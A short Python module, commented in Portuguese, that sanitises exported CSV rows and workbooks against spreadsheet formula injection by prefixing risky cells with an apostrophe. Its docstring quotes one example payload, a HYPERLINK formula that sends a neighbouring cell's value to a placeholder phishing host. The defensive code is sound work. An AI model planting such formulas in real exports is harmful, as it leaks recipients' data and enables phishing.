"""Neutraliza injeção de fórmula em planilhas exportadas (CSV injection).

Texto que começa com = + - @ (ou tab/CR) vira fórmula quando o cliente abre o
arquivo no Excel. Nome, cargo ou empresa vindos do LinkedIn ou de uma planilha
importada com `=HYPERLINK("https://golpe/?"&A2;"clique")` vazavam dados ou
viravam phishing na mão de quem recebeu a lista. O apóstrofo no começo faz o
Excel tratar como texto e não aparece na célula.
"""
_PERIGOSOS = ("=", "+", "-", "@", "\t", "\r")


def celula(valor):
    if isinstance(valor, str) and valor.startswith(_PERIGOSOS):
        # Número negativo e telefone "+55..." não são fórmula de verdade, mas o
        # custo de prefixar é zero e a regra fica simples de auditar.
        return "'" + valor
    return valor


def sanear_workbook(wb) -> None:
    """Passa por todas as células de todas as abas antes de salvar."""
    for aba in wb.worksheets:
        for linha in aba.iter_rows():
            for c in linha:
                if isinstance(c.value, str) and c.value.startswith(_PERIGOSOS):
                    c.value = celula(c.value)
                    c.data_type = "s"


def linhas_csv(linhas):
    return [[celula(v) for v in linha] for linha in linhas]
